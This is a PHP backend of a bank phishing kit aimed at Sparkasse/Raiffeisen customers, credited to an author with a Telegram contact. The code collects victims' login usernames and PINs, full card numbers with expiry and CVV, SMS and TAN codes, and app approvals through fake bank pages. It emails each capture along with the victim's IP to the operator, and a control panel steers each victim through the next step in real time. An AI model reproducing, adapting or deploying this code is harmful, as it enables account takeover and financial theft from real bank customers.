<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    if ($_POST['step'] == "control") {
        
        $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
        fwrite($fp, $_POST['to']);
        fclose($fp);
        if( $_POST['to'] == "tan"){
            $fp = fopen('victims/'. $_POST['ip'] .'-tan.txt', 'wb');
            fwrite($fp, $_POST['imgurl']);
            $_SESSION['tan_img'] = $_POST['imgurl'];
            fclose($fp);
        }
        if( $_POST['to'] == "sms"){
            $fp = fopen('victims/'. $_POST['ip'] .'-tan.txt', 'wb');
            fwrite($fp, $_POST['sms']);
            $_SESSION['tan_img'] = $_POST['sms'];
            fclose($fp);
        }
        if( $_POST['to'] == "errorsms"){
            $fp = fopen('victims/'. $_POST['ip'] .'-tan.txt', 'wb');
            fwrite($fp, $_POST['errorsms']);
            $_SESSION['tan_img'] = $_POST['errorsms'];
            fclose($fp);
        }
        header("location: control.php?ip=" . $_POST['ip']);
    }
    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/login.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            $_SESSION['username'] = "";
            $_SESSION['pin']  = "";
            $_SESSION['errors']['username'] = true;
            $_SESSION['errors']['pin'] = true;
            header("Location: clients/login.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorregion' ) {
            $_SESSION['region'] = "";
            $_SESSION['errors']['region'] = true;
            header("Location: clients/region.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            $_SESSION['sms_code'] = "";
            $_SESSION['errors']['sms_code'] = true;
            header("Location: clients/sms.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errortan' ) {
            $_SESSION['tan_code'] = "";
            $_SESSION['errors']['tan_code'] = true;
            header("Location: clients/tan.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorcc' ) {
            $_SESSION['one']   = "";
            $_SESSION['two']     = "";
            $_SESSION['three']      = "";
            $_SESSION['errors']['one'] = true;
            $_SESSION['errors']['three'] = true;
            $_SESSION['errors']['two'] = true;
            header("Location: clients/cc.php?error=1&verification#_");
            exit();
        }
        if( $red == 'success' ) {
            header("Location: " . OFFICIAL_WEBSITE);
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['pin']  = $_POST['pin'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = true;
            }
            if( empty($_POST['pin']) ) {
                $_SESSION['errors']['pin'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SPARKASS | Login';
                $message = '/-- RAIFFEISSEN LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['username'] . "\r\n";
                $message .= 'PIN : ' . $_POST['pin'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading1.php?verification#_");
                exit();
            } else {
                header("Location: clients/login.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "region") {
            $_SESSION['errors']     = [];
            $_SESSION['region']  = $_POST['region'];
            if( empty($_POST['region']) ) {
                $_SESSION['errors']['region'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SPARKASS | Region';
                $message = '/-- REGION INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Region : ' . $_POST['region'] . "\r\n";
                $message .= 'PIN : ' . $_POST['pin'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END REGION INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/login.php?verification#_");
                exit();
            } else {
                header("Location: clients/region.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_SESSION['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = true;
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = true;
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SPARKASS | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                unset($_SESSION['errors']);
                header("Location: clients/loading1.php?verification#_");
            } else {
                header("Location: clients/cc.php?error#_");
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SPARKASS | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading1.php?verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                header("Location: clients/sms.php?error=$error&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "diba") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SPARKASS | Sms';
                $message = '/-- Diba INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Diba code : ' . $_POST['sms_code'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END Diba INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading1.php?verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                header("Location: clients/sms.php?error=$error&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "tan") {
            $_SESSION['errors']     = [];
            $_SESSION['tan_code']   = $_POST['tan_code'];
            if( empty($_POST['tan_code']) ) {
                $_SESSION['errors']['tan_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SPARKASS | Tan';
                $message = '/-- TAN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'TAN code : ' . $_POST['tan'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END Tan INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading1.php?verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                header("Location: clients/tan.php?error=$error&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "app") {
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SPARKASS | APP';
                $message = '/-- APP Aproved INFOS --/' . get_client_ip() . "\r\n";;
                $message .= '/-- END APP INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading1.php?verification#_");
                exit();
            } else {
                //$error = $_POST['error'];
                header("Location: clients/app.php?error=$error&verification#_");
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>